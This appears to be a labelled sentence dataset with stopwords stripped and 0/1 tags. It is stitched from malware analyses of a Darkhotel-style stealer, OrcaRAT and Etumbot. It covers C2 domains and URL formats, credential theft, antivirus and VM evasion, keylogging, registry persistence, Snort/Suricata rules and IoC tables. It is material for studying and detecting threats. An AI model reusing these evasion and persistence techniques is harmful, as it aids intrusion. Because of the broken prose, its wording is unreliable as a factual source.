After compiles string describing system following format « C P U % CPUNAME % br Net card % IP % ( % MACADDR % ) br »	0
Next checks string contains one following substrings If strings found module terminates	0
After hardcoded value 10 delays execution module 10 seconds	0
Then module attempts delete prob- ably older components might present system	1
The list deleted files includes following The next step check current directory file named «U»	1
If module proceeds network communication routine	0
But file found additional checks	0
If «U» file older 180 days module wipes file	1
If triggers special variable makes module dormant dis- ables communication C & C server	1
After module ready allowed communicate C & C server following manner	0
1	0
The module connects autolace.twilightparadox.com ( automachine servequake.com ) issues HTTP GET request hardcoded User­Agent string The server response contain «DEXT87» string used rec- ognize valid response	1
The malware locates «DEXT87» reads data appended	0
The appended data IP address plaintext	0
This used real C & C IP address	0
Reading stops non­digit dot symbol found	0
Here example shortest possible valid server response 2	0
If real C & C IP address valid module may try send identical request using different HTTP path If C & C IP address valid module issues another HTTP request The server response one following Where DATASIZE decimal integer represents length DATA field bytes; DATA binary data separated DATASIZE field semicolon	1
Please note receiving DATA XORed byte value 0x55 saved disk file named «ctfmon.exe» ( current directory used )	1
Upon successful receiving file started new process	0
This module relatively large ( 455Kb ) comes part WinRar SFX file drops starts module % APPDATA % \Microsoft\Display\DmaUp3 exe	1
The main purpose module collect various secrets stored local system	1
This module designed run Windows system default codepage set Korean	0
From beginning module checks «bdagent.exe» process running current system	1
Bdagent.exe name BitDefender Antivirus component	0
If running uses simple AV heuristics evasion technique	1
The code starts thread simulates keystrokes ESC keyboard key shows system modal message box	1
Pushing ESC key closes modal message box	0
Right keystroke generation thread terminated module continues normal execution «bdagent.exe» running	1
Next module makes sure one instance current code running checking system mutex object named «920111215» exists	1
After mod- ule collects information current system includes following If module reveals current System default codepage 0412 ( Korean ) terminates	1
There one interesting specifics Microsoft IntelliForms reveals attack- er 's interests	0
IntelliForms technology keeps login/password information registry encrypted form	0
However clear information corre- sponding website requires given login password	0
The information Intelliforms offers place given login/password used hash webpage URL	0
So far attackers steal logins pass- words understand must guess string produced given hash	1
They implemented logics malware	0
When IntelliForms information stolen malware tries check list known login page URLs recover originating webpage address	1
Here list URLs checked malware The list targeted services includes local services specifically popular The module uses several simple XOR­based algorithms encrypt embedded string data	1
String encryption/decryption functions use following keys The module works Firefox versions prior Mozilla Firefox 12.0	0
Depend- ing version Firefox read Firefox database directly dump stored se- crets utilize one Firefox libraries access configuration data	0
In addition makes use following Mozilla Firefox libraries depending Firefox version When stealing secrets Firefox Chrome uses built­in SQLite library code	1
The module linked SQLite version 3.7.5 release candidate 2 release hash ed759d5a9edb3bba5f48f243df47be29e3fe8cd7 dated 2011­01­28 17:03:50	0
After stealing secrets local system malware executes kind embedded script	1
It logging actions inform operator exactly executed variant malware	1
The result execution appended stolen data uploaded C & C server	1
The module uploads collected information one following URLs via POST request It 's first time see .pn	1
domain used malware	0
This top level country code domain quite exotic assigned Pitcairn Islands Overseas ter- ritory United Kingdom Pacific	0
As 2013 estimated population Pitcairn Islands 56 people	0
An official .pn	0
domain costs $ 100/year registry however .eu.pn	0
domains seem given away free	0
The malware uses fixed User­Agent string The data uploaded POST request binary following format UserId hardcoded identifier ( i.e	1
«user2» current sample ) ; UniqueMachineId 32 characters long hex string derived net- work card MAC address; EncryptionKey symmetrical encryption key used encrypt UserId GeneralSysInfo values	0
The malware uses text protocol potentially binary values UserId GeneralSysInfo ad- ditionally encoded using Base64 algorithm	0
GeneralSysInfo field contains basic information system i.e	0
If server reply contains keyword «minmei» continues sending additional in- formation	1
«Minmei» may reference popular Japanese anime manga known «The Super Dimension Fortress Macross»	0
A quote Wikipedia «Born Yokohama Chinatown Japan ( though partial Chinese descent ) Linn Minmei Minmay moved uncle Shaochin ( 少江 ) aunt Feic- hun ( 慧中 ) South Ataria Island hopes finding path fulfill dream becoming star.» The trojan iterates running processes looks security software basing executable filenames list	1
If process found keeps record software name using short AV Identifier string fol- lowing table rules The malware uses trick evade running VMware	1
First checks cur- rent process running WOW64 environment	1
If yes additional port I/O specific VMWare virtual machine ( VMware hypervisor port 0x5658; VMware hypervisor magic value 0x564D5868 )	0
Another method detect VM en- vironment check local network adapter 's IP address	1
If belongs subnet 192.168.100	0
* malware believes 's running VM	0
If VM detected process instantly terminates	1
Next malware submits collected information C & C server using HTTP GET request following URL format http // C2DOMAIN /bin/readi.php ? a1= % STEPID % & a2= % HOSTID % & a3= % SYSINFO % & a4= % AVSOFTID % % C2DOMAIN % one following C & C domains % STEPID % special text string indicating stage malware operation	1
This string varies depending local system language may one following % HOSTID % special value generated local network card MAC address; % SYSINFO % string general system information ( please see description ) ; % AVSOFTID % string contains indexes AV software names internal table AV Identifiers ( please see table )	0
Igfxext.exe download file drop % APPDATA % \microsoft\dis- play\ctfmon.exe ( md5= e8bfb82b0dd5cef46116d61f62c25060 )	1
After execution downloaded file drops SMAGENT.EXE ( md5 0306f9ae- 7786570139f78e78bc940597 ) % APPDATA % \MICROSOFT\DISPLAY ex- ecutes	1
This component virus used selectively infiltrate computers via USB network shares	1
A large number files detected Kaspersky Lab scanners Virus.Win32	0
Pioneer.dx	0
These files legitimate files infected another Darkhotel component	1
All infected files drop 63kb self injecting compo- nent	1
This malware 63kb size	0
It bound variety software packages vary name host package consistently detected '' Virus.Win32	0
Pioneer.dx ''	0
The igfxext.exe component dropped disk run	1
It spawns an- suspended process igfxext.exe image decrypts smaller 32kb executable ( cf1319d94f33380622ba000b7d8ad6e9 Trojan­Downloader	1
Win32.Agent.xwge ) .data	0
section memory simple xor 0xbb	0
The running process overwrites igfxext.exe image suspended process smaller chunk code	1
It resumes thread new process	0
This smaller code section maintains similar functionality '' worm '' compo- nent Host package files detected '' Virus.Win32.Pioneer.dx '' infected legitimate files self­propagation routines	1
It signed familiar '' '' digital certificate	0
This sample started code running within svchost.exe WinXP SP3	1
It drops keylogger	1
The debug path inside The dropper maintains drops installs kernel mode keylogger Likely developed part mid­to­late 2009 project This driver package built look like legitimate low level Microsoft system device	1
It installed system kernel driver '' Ndiskpro '' service described '' Microcode Update Device ''	1
It somewhat surprising rootkit functionality hiding service When loaded NDISKPRO.SYS driver hooks INT 0x01 INT 0xff retrieves keystroke data directly port 0x60 motherboard keyboard con- troller	1
Here see local port variables assigned values And ports directly read READPORTUCHAR ( 0x64 ) READPORTUCHAR ( 0x60 ) It buffers communicates data running user mode component	0
This component encrypts writes retrieved values ondisk ran- domly named .tmp file like ffffz07131101.tmp	1
This file located directory original dropper maintains persistence across reboots simple addition HKCU run key	1
Here debug output demonstrating component 's data retrieval letter '' D '' repeatedly pressed keyboard	0
Keyscan make break codes '' 0x20 '' '' 0xA0 '' key press key release '' D '' key	0
The '' 0x1D '' value port 0x64 see basically indication output buffer full keyboard locked safe driver access key value port 0x60 These debug messages code style duplicates chpie posted past	0
This keylogger module encrypts stores gathered data log file men- tioned previously	1
Its encryption algorithm similar RC4	0
Interesting part module randomly generates key stores unexpected place middle log file name	0
Hence numeric part filename used seed pseudorandom number generator	0
Rand function statically linked insure results different computers	0
By Dan Kelly Tom Lancaster It 's every malware analyst 's dream handed sample far unnamed AV community - especially malware question may links well - known APT group	0
In line work I analyse several ' unknown ' malware samples week often turns simply new variants existing malware families	0
Recently I fortunate enough handed something low detection rate aside heuristics seemed relatively unknown top 40 anti - virus companies	0
In post I walk malware family 've dubbed " OrcaRAT "	0
First worth pointing malware I see day - - day basis espionage orientated rarely programmers operators make much effort cover tracks	0
The use forged HTTP headers common occurrence simple mistakes within headers frequent	0
The malware question handed one threat intelligence analysts hunting infrastructure associated samples Comfoo[1 ] malware happened across malware sample ( 253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613 ) n't recognise	0
He immediately took malware passed first stage analysis involves running file sandbox environment	0
After handed - depth capability analysis	0
The structure I began looking sandbox report	0
The first thing drew attention URI structure	0
( A screenshot showing HTTP headers URI structure OrcaRAT produces ) To us familiar decoding data notice URI string formatting appears modified version Base64 algorithm	0
To understand structure must reverse engineer functions generate encode data	0
Firstly begin analysing routines produce data later encoded sent HTTP URI field	0
The first thing jumped disassembling malware simplicity cleanliness code	0
There also significant number Windows Crypto API[2 ] functions imported malware assume indicates uses encryption	0
( A screenshot showing functions imported OrcaRAT ) Delving deeper disassembly come across preamble URI generation function	0
( A screenshot showing decoding generation string value ) The function uses Windows crypto API generate random number 6 bytes dynamically builds appends word " OrcaKiller " end number	0
In one example final product " \x61\xBA\xF4\x44\x52\xF1OrcaKiller " ( \x denotes hexadecimal values )	0
Once value produced malware begins constructing URI	0
With many pieces malware initial communications sends command control server ( known beaconing phoning home ) usually include pieces information victim system	1
OrcaRAT exception	0
The randomly generated values noted actually used encrypt several pieces information extracted system even key included	1
( A screenshot showing encryption function used OrcaRAT ) All values extracted system encrypted using RC4[3 ] algorithm base64 encoded	0
The RC4 encryption key derived MD5 hash[4 ] randomly generated bytes concatenated ' OrcaKiller ' string	0
Once data encrypted base64 encoded	0
Any forward slashes base64 string replaced tilde - pseudo code shown	0
Once values encrypted formatted URI following structure	0
( A screenshot showing URI structure OrcaRAT command control activity ) The campaign ID value constructed using method similar encryption key	0
( A screenshot showing generation first hidden string value ) It would appear authors want anybody able easily see value	0
This gives us OrcaKiller wHaLe	0
It would appear adversary salty sense humour	0
Command control As malware command control functions reveal true nature intent operators	0
Up determined malware communicates server	0
We investigate mechanisms server uses communicate interact victim	0
The command control routine OrcaRAT appears serve two purposes	0
Interestingly routines split two branches	0
Each branch command control activity determined unique response remote server	0
Command control takes form webpage	0
Unlike malware designed well - known Comment Crew[5 ] group hide commands HTML comments instead places plain view	0
The first set commands force malware behave simple downloader	1
( A screenshot showing OrcaRAT parsing HTML code behind webpage ) Upon downloading webpage server malware looks specific sets HTML tags	0
The first set P terminating tag /P>.	0
Once malware found tags drops first command control function	0
The malware extracts payload text HTML tags runs decryption routine	0
The encryption key sent URI string used decrypt text	0
Once payload text decrypted malware treats binary executable file written disk executed	1
The second set HTML tags allows operator drop malware set remote control functions	0
This time malware searches H1 tag terminated /H1>.	0
Once payload text tags extracted decrypted using encryption key found URI string	0
The payload text page much smaller ultimately points command function operator executed	0
( A screenshot showing structure command control routines within OrcaRAT ) The command control structure fairly simplistic provides operator access victim machine 's filesystem command line allows attacker perform various tasks executing arbitrary commands uploading downloading files compromised system	1
After command control message received OrcaRAT sends HTTP POST message back command control server	1
Each time URI built generates new encryption key showing command control server least serving dynamic content	0
Given command structure logical assume command control server requires operator manually issue specific commands victim workstation default command likely ' sleep '	0
Given information reasonably assume malware likely designed first stage implant	1
History shown malware designed way usually done allow operator initial level access compromised system usually surveying victim deciding whether deploy capable valuable second stage malware implant	0
Detection Once OrcaRAT delivered victim system number ways detect	0
Firstly cover disk detection using Yara	0
The rule detect OrcaRAT binary executable written compromised machine 's disk	0
OrcaRAT also detected two separate ways network level using Snort Suricata IDS rule	0
Detecting malware different stages connectivity important	0
By creating signatures nexus kill chain[6 ] determine stage intrusion reached	0
The two signatures indicate whether intrusion reached command control action - phases	0
Snort	0
alert tcp - ( msg:"::[PwC CTD ] - OrcaRAT implant check - " ; flow established from_client ; urilen 67<>170 ; content:"User - Agent Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_header ; content:"GET " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid YOUR_SID ; rev:1 ; ) alert tcp - ( msg:"::[PwC CTD ] - OrcaRAT implant C2 confirmation response " ; flow established from_client ; urilen 67<>170 ; content:"User - Agent Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_header ; content:"POST " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid YOUR_SID ; rev:1 ; ) Suricata	0
alert http - ( msg:"::[PwC CTD ] - OrcaRAT implant check - " ; flow established from_client ; urilen 67<>170 ; content " Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_user_agent ; content:"GET " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid YOUR_SID ; rev:1 ; ) alert http - ( msg:"::[PwC CTD ] - OrcaRAT implant C2 confirmation response " ; flow established from_client ; urilen 67<>170 ; content " Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_user_agent ; content:"POST " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid YOUR_SID ; rev:1 ; ) Appendix A Samples Orca RAT	0
Appendix B Related indicators	0
Arbor Threat Intelligence Brief 2014 - 07 ASERT Threat Intelligence June 2014 Etumbot backdoor used targeted attacks since least March 2011	0
Although previous research covered related family IXESHE little discussed regarding Etumbot 's capabilities	0
ASERT observed several Etumbot samples using decoy documents involving Taiwanese Japanese topics interest indicating malware used ongoing targeted campaigns	0
This report provide information capabilities Etumbot associated campaign activity	0
Etumbot backdoor malware associated Chinese threat actor group alternatively known " Numbered Panda " APT12 DYNCALC / CALC Team IXESHE	0
Targeted campaigns attributed group include attacks media technology companies governments	0
IXESHE / Numbered Panda known using screen saver files ( .scr ) technique repeated Etumbot malware	0
[ 1 ] A previous campaign using IXESHE malware highlighted 2012 ; group used targeted emails malicious PDF attachments compromise East Asian governments Taiwanese electronics manufacturers telecommunications company	1
The group reportedly active since least July 2009	0
[ 2 ] Etumbot also referred Exploz [ 3 ] Specfix	0
The variety names malware could lead confusion actual threat	0
ASERT associated Etumbot IXESHE therefore Numbered Panda based similar system network artifacts common malware families	0
For example malware families seen using ka4281x3.log kb71271.log files families observed calling back Command & Control servers used target similar victim populations similar attack methodologies	1
Etumbot two primary components	0
The first dropper contains backdoor binary ( second component ) distraction file	1
Stage one likely delivered via spear phish using archive file extension .7z deliver executable content	0
Stage one seen leverage Unicode Right Left Override trick combined convincing icons various types PDFs Microsoft Office documents convince user click therefore execute malware runs backdoor displays distraction file	0
As IXESHE malware Etumbot observed dropping documents interest Taiwanese Japanese target population	0
To profile techniques capabilities Etumbot analyze Etumbot dropper MD5 ff5a7a610746ab5492cc6ab284138852 compile date March 4 2014	0
When executed dropper loads resource named " BINARY " resource section creates directory C:\Documents Settings\User\Application Data\JAVA creates temporary file C:\DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log creates C:\Documents Settings\User\Application Data\JAVA\JavaSvc.exe aforementioned BINARY resource	1
This file JavaSvc.exe backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 )	0
JavaSvc.exe executed CreateProcessInternalW.	0
The backdoor component malware ( named JavaSvc.exe ) running	0
It interesting note versions IXESHE malware also used JavaSvc.exe filename	0
Most Etumbot samples observed ASERT drop decoy documents ( PDFs Word Documents Excel Spreadsheets ) written Traditional Chinese usually pertaining Cross - Strait Taiwanese Government interests	1
Several decoy files contain details upcoming conferences Taiwan	0
Etumbot appears sent targets via spear phishing emails archive ; ASERT observed .7z .rar formats used presumably deliver Etumbot installer	0
The archive filename topic likely interest victim	0
At least one identified malware sample ( 75193fc10145931ec0788d7c88fc8832 compiled March 2014 ) uses password - protected .7z deliver Etumbot installer	0
It likely spear phish email contained password	0
With correct password victim access dropper inside archive	0
This archive likely included installer d444be30d2773b23de38ead1f2c6d117 filenames match ( 1030522 新 機關籌備小組清單.7z 1030522 新機關籌備小組清單 rcs DOC )	0
1030522 date ( May 22 2014 ) Minguo calendar unique Taiwan	0
The calendar based establishment rd Republic China 1911	0
2014 therefore " 103 " year ROC	0
The installer .scr binary posing Word Document	0
This dropper drops decoy document backdoor named sysupdate.exe instance	0
Right - - Left Override After files extracted archive filenames Etumbot installers make use right - - left override ( RTLO ) trick attempt trick users clicking installer	0
The RTLO technique simple way malware writers disguise names malicious files	0
A hidden Unicode character filename reverse order characters follow .scr binary file appears .xls document example	0
Threat actors using trick well documented since least 2009	0
[ 4- 5 ] One way avoid trick Windows set " Change view " level " Content "	0
[ 6 ] Below names Etumbot installers using RTLO successfully	0
As backdoor executes previous example C:\DOCUME~1\User\LOCALS~1\Temp\ kb71271.log created contains following registry file make malware persistent	1
[ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ] " JavaSvc"="C:\\Documents Settings\\User\\Application Data\\JAVA\\JavaSvc.exe " The dropper calls regedit kb71271.log parameter modify registry	1
kb71271.log deleted	1
These temp files appear static used across multiple samples Etumbot IXESHE	0
Various samples found using naming scheme	0
Next C:\DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log created filled contents bait / distraction file copied C:\DOCUME~1\User\LOCALS~1\Temp\~t3fcj1.doc opened	1
If Word n't installed notepad open file instead	0
The ka4281x3.log file deleted	1
Returning first sample dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) initial HTTP beacon sent Command & Control server requests RC4 encryption key	1
The beacon takes form GET request /home / index.asp?typeid = N N randomly selected odd number 1 13	0
If C&C online decoded response payload contain RC4 key used encrypt subsequent communication	1
If C&C send valid response bot - send initial request every 45 seconds	0
While user - agent may appear legitimate occurred 39 times corpus 61 million HTTP requests	0
Due possibility User - Agent appearing legitimate traffic indicators – additional fake Referer value http://www.google.com present compromise assumed	0
All headers HTTP request hard - coded order value may used provide additional indicators compromise	0
If C&C online responds beacon RC4 key delivered bot string base64 encoded characters	1
Etumbot uses url - safe base64 alphabet i.e. characters would require URL - encoding replaced	0
Usage base64 technique consistent previous analysis done IXESHE malware	0
[ 2,7 ] In case Base64 " / " " = " characters replaced " _ " " - " respectively	0
The payload C&C contains 8-byte command code little - endian format followed null - terminated string argument command requires	0
In case initial beacon response RC4 key located command code observed e65wb24n5 live C&C 's ASERT analyzed	0
An example initial beacon delivery RC4 key follows	0
The RC4 key obtained C&C response following python	0
While payload 1080 bytes sent back majority appears random padding	0
Once bot received encryption key bot sends registration callback C&C /image/<encrypted data>.jpg containing encrypted values system information include NetBIOS name system user name IP address system using proxy ( Yes / No ) numeric value may type campaign code	1
IXESHE malware also observed using unique campaign code delivered back C&C.	0
[ 7 ] Etumbot discovers proxy settings local machine	1
If proxy defined communications C&C bypass proxy go directly Internet	0
Environments system - defined proxies wo n't get activity proxy logs however transparent proxies may see activity	0
A contrived example registration string generated Etumbot backdoor prior encryption follows	0
WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147| Once bot registered C&C send periodic pings ask new commands execute	1
The URI ping requests /history/<encrypted NetBIOS name>.asp encrypted NetBIOS name url - safe base64 encoding rc4-encrypted NetBIOS name	0
The first eight bytes C&C responses bot include command second eight bytes contain ASCII string parsed	0
In event file download file upload command execution second eight bytes contain filename command executed	0
The parsing function inside binary reveals least five commands	0
ETUM_CMD_EXEC provides capability attacker run command compromised hosts	0
Both stdout stderr command redirected pipe relayed back C&C using separate thread spawned initialization	0
In event process creation hang error HTTP transaction /tech / s.asp / m=<message sent C&C message contains create process error statement " CreateProcess Error % " message states " Process Do exit 10 second Kill "	0
Some samples droppers observed using string " Process Do cunzai 10 second Kill "	0
The word " cunzai " likely pinyin ( romanization ) Mandarin word ' exist '	0
ETUM_CMD_PUTFILE provides capability files placed local system C&C.	0
The file upload accomplished sending request /docs / name=<data C&C expected respond full contents file response payload	0
A success failure status message relayed via call /tech / s.asp?m=<encrypted status message various reasons failure potentially relayed	0
ETUM_CMD_READFILE allows file compromised system uploaded C&C.	0
When READFILE command received C&C bot makes initial call /manage / asp / item.asp?id=<encrypted computer name>&&mux=<encrypted total file size checks presence " I 'm Ready " response C&C.	1
Data file read 2000 byte chunks RC4 encrypted url - safe base64 encoded	0
The data sent back C&C via URI /article/30441/Review.asp?id=<encoded computer name>&&date=<file chunk data	1
The bot expects message " OK " C&C response sent terminate upload send error message C&C case seen	1
A success failure message sent via /tech / s.asp?m=<encrypted status message complete terminate upload	0
ETUM_CMD_SLEEP puts bot dormant state period time	0
When bot receives sleep command relay message " I sleep % minutes " via call /tech / s.asp?m=<encrypted message>.	0
ETUM_CMD_UNINSTALL deletes binary terminates process additional communication C&C.	0
Etumbot uses technique load strings memory called " byte strings " also " string stacking " whereby character values loaded specific memory location one byte time	1
Assuming string values change frequently byte strings make meaningful detection capabilities discovering unusual combination characters ( include typos unique odd syntax ) loaded memory creates unique fingerprint malware activity used part yara rule detection mechanism	0
The byte string technique observed various Chinese APT malware including Gh0st RAT IXESHE malware Etumbot others	0
ASERT provided IDApython script provide cleaner analysis strings well corresponding blog entry describes obfuscation technique code	0
[ 8 - 9 ] The output running find_byte_strings.py Etumbot backdoor shows string " I 'm Ready " involved file transfer routines	0
The first screenshot shows default hex byte values MOVed offsets EBP second screenshot shows characters translation string values	0
Two additional screenshots provide insight strings discovered	0
The byte string technique also observed malware presence alone specifically indicate activities Chinese threat actors	0
An interesting artifact occasionally observed analysis presence numeric value IP address used C&C.	0
The placement number colon suggests use port value however port value high valid	0
An example taken Etumbot sample performing initial beacon follows	0
11 Most instances Etumbot analyzed connect directly IP address IP address hardcoded binary	0
These C&C 's obtained analyzing malware samples compiled period several years	0
A number C&C IP addresses also used IXESHE - related malware seems indicate Etumbot often used tandem IXESHE	0
The domain finance[.]yesplusno[.]com IP address 211[.]53.164.152 also used variety IXESHE samples instance	0
The registrant domain yesplusno[.]com listed " alice yoker " wit email address " chuni_fan@sina.com "	0
Other domains registered name also used C&C IXESHE	0
securezone[.]yesplusno[.]com [ 10 ] prishmobile[.]googlesale[.]net yahoopush[.]googlesale[.]net The IP address 98.188.111.244 also used C&C multiple IXESHE samples beginning least March 2013 observed recently March 2014 Etumbot sample	1
This IP address appears legitimate website school Taiwan intro.sunnyschool.com.tw	0
Note HTran connection bouncer used C&C may legitimate site simply compromised used direct traffic elsewhere	0
Indicators suggest HTran connection bouncer used cases C&C contacted malware sample MD5 1ce47f76fca26b94b0b1d74610a734a4 ( compilation date March 12 2014 )	0
The presence HTran based following response string HTran also called " HUC Packet Transmit Tool " developed member Honker Union China hacker group ; source code program available online	0
[ 11 ] HTran designed redirect TCP traffic intended one host another used IXESHE malware previously	0
[ 2 ] Researchers SecureWorks determined years back HTran would deliver IP address final destination server final server unreachable	0
The code use modified reveal information	0
Organizations properly positioned netflow traffic analysis capabilities may able locate upstream servers HTran nodes operate initial tier C&C.	0
Htran activity detected following signature	0
ET CURRENT_EVENTS HTran / SensLiceld A response infected host The import hash sample observed connecting Htran bouncer a9059c354e5025dfe4f1c0b8b57e4f62 links Etumbot samples compiled Microsoft Visual C++ 5.0 similar March 2014 timeframe	0
• 4c703a8cfeded7f889872a86fb7c70cf 2014 - 03 - 24 • ff5a7a610746ab5492cc6ab284138852 2014 - 03 - 04 The following samples identified ASERT Etumbot malware	0
The first identified sample compilation date March 2011 recent compiled May 2014	0
Many droppers / installers contain Etumbot alternatively IXESHE - related backdoors	0
Most documents dropped Etumbot written traditional Chinese	0
Traditional Chinese ( versus simplified Chinese used mainland China ) widely used Taiwan	0
While areas make use traditional Chinese ( Hong Kong Macau ) topics decoy documents strongly suggest Taiwanese entities targets many Etumbot samples	0
A recent increase Etumbot samples configuration dates 2014 seems indicate Numbered Panda / IXESHE group increased activity lately begun using Etumbot widely targeted campaigns	0
ac22aa007081caeb8970aefba7eddfcf Compilation Date 2011 - 03 - 09 14:10:34 C&C N / A Filename Help statement western U.S ? cod.scr Archive HelpXstatementXfromXwesternXU.SX.rar ( c2d667b8072aa2eaa670d4459dd7c90d ) Dropped Files ~$workp.doc ( 7ec4ece7358f9f67a4d583777dc1fb59 ) ka4281x3.log kb71271.log WINCHAT.EXE ( 70424b91dc905e4ca5e4aeb1c62ed91f ) cd33c5467d425f662f57672531701d89 Compilation Date 2011 - 03 - 14 02:49:22 C&C N / A Filename N / A Dropped Files ~$workp.doc ( 731f288ebd8ff05b3a32377d9d7f4751 ) WINCHAT.exe ( e62453f41af9d87b4f6d4e8223926024 ) 04908c6853cb5c9d7dccaf15fb5fd3bb Compilation Date 2011 - 03 - 24 03:24:42 C&C 32.114.251.129 ( US ) 217.119.240.118 ( RS ) 202.106.195.30 ( CN ) larry[.]yumiya[.]com Filename N / A Dropped Files ~$workp.doc ( 4d47f52c675db16ab1e1df5ac050d3b8 ) ka4281x3.log kb71271.log WINCHAT.exe ( 47ee9a497a12272b50bb5e197935f13f ) 232b659e28c5e06ad5466c01aec35cb6 Compilation Date 2012 - 09 - 19 08:53:14 C&C 200.27.173.58 ( CL ) Filename N / A Dropped Files ka3157j.log W3svc.exe ( 1e838fd06bcc64c54e75c527df164d91 ) 7a698acebcf19b55170f05388a2f7fe0 Compilation Date 2012 - 10 - 12 01:21:11 C&C N / A Filename N / A Dropped Files ka3158jl.log iexplore.exe ( ac7f77cc55c964e400b8926f21bed7d2 ) 1e8fba674761371cb9e88962dcb851c0 Compilation Date 2012 - 11 - 20 00:11:02 C&C 211.53.164.152 ( KR ) finance[.]yesplusno[.]com Filename N / A Dropped Files ~PG7953.doc ( adc0ffd684d9a986d65cb4efba39c3fe ) ka3157jl.log kb71271.log iexplore.exe ( 37648553f4ee6c5cb712cca446340a9a ) 88653dde22f723934ea9806e76a1f546 Compilation Date 2012 - 12 - 05 01:30:07 C&C 190.193.44.138 ( AR ) cht[.]strangled[.]net Filename N / A Dropped Files N / A ( sample dropped backdoor ) 2b3a8734a57604e98e6c996f94776086 Compilation Date 2012 - 12 - 05 02:13:27 C&C 92.54.232.142 ( GE ) Filename 補捐助案件結餘款處理調查表.doc .exe Dropped Files ~DS5D64.doc ( 2454c4af0b839eb993dd1cbb92b2c10d ) ka4281x3.log conime.exe ( 3214bf22eb28e494b8e23d8ffc5ac4a9 ) 1498c9761fc819d496171c71604c2128 Compilation Date 2012 - 12 - 11 02:26:18 C&C N / A Filename 部會文宣聯繫名單 cod.scr Dropped Files ~DS5D64.doc ( e8b92d20a9c4718b4f90d27cd8cba4b3 ) conime.exe ( 0bfb9f2080aeee22d3b4ca6fbfd25980 ) 063b6076c69ce3ba4f116d1ad51da2b5 Compilation Date 2012 - 12 - 12 01:26:54 C&C N / A Filename N / A Dropped Files ~PG7953.doc ( c4af36f64d515569816263ca48f61899 ) ka3157jl.log iexplore.exe ( 5b15664fb744c3f3cf7ec7b5515d2be5 ) ca838b98ca0f516858a8a523dcd1338d Compilation Date 2013 - 07 - 25 07:48:29 C&C 143.89.145.156 ( HK ) Filename N / A Dropped Files ~g4h710.doc ( 729353afd095ca07940490dbb786ee33 ) ka4281x3.log kb71271.log JavaSvc.exe ( 36b42162c818cf6c2fb22937012af290 ) 986937eb4052562cdd3960dd8fffc481 Compilation Date 2013 - 07 - 30 08:22:06 C&C 200.42.69.140 ( AR ) Filename N / A Dropped Files ~g4h710.pdf ( 7cd7db8ff8071d590567c68ea0219f23 ) ka4281x3.log kb71271.log JavaSvc.exe ( ee8ba3bef6a607af79405e75fb0f0d6f ) 5ef508d0ca7759ecf602192521fff287 Compilation Date 2013 - 08 - 01 00:47:08 C&C 200.42.69.140 ( AR ) Filename N / A Dropped Files ~t4hhk0.pdf ( 6b7cbcabd963ee4823dd2cd9daa5fcc7 ) ka4281x3.log kb71271.log JavaSvc.exe ( ee8ba3bef6a607af79405e75fb0f0d6f ) ff5a7a610746ab5492cc6ab284138852 Compilation Date 2014 - 03 - 04 00:19:59 C&C 98.188.111.244 ( US ) ͧ Filename WTO^XPiii20140303 _ slx.scr Dropped Files ~t3fcj1.doc ( 361a6752766c154c6e31a4d9cc3a3fdc ) kb71271.log ka4281x3.log JavaSvc.exe ( 82d4850a02375a7447d2d0381b642a72 ) 1ce47f76fca26b94b0b1d74610a734a4 Compilation Date 2014 - 03 - 12 01:38:44 C&C 133.87.242.63 ( JP ) Filename APO EPIF 邀請函 rcs.xls Dropped Files ~tresd2.xls ( 2e073d35934bb3920fe9907ccb7bc5f8 ) ka4281x3.log kb71271.log wscnsvr.exe ( deeec10be746ecf9bf46a30bf58bc784 ) 4c703a8cfeded7f889872a86fb7c70cf Compilation Date 2014 - 03 - 24 00:53:57 C&C 133.87.242.63 ( JP ) Filename 國發會 1030324 第 1 次委員會重要議題通報 finalrcs.xls Archive .rar ( 9b42968e9a7646feb7db318713271718 ) Dropped Files ~t3fcj1.xls ( 18dc518810892d89430a1efe2c71797e ) ka4a8213.log kb71271.log serverupdate.exe ( fed7ce0d20e78b5814475d8f9d062c80 ) beb16ac99642f5c9382686fd8ee73e00 Compilation Date 2014 - 03 - 31 07:34:00 C&C 143.89.47.132 ( HK ) Filename 10342 委會-審查金融法規修正草案報告 rcs.xls Dropped Files ~tkfad1.xls ( eef5f9b46676b31a791216b42360c8bb ) ka4a8213.log kb71271.log Googleupdate.exe ( 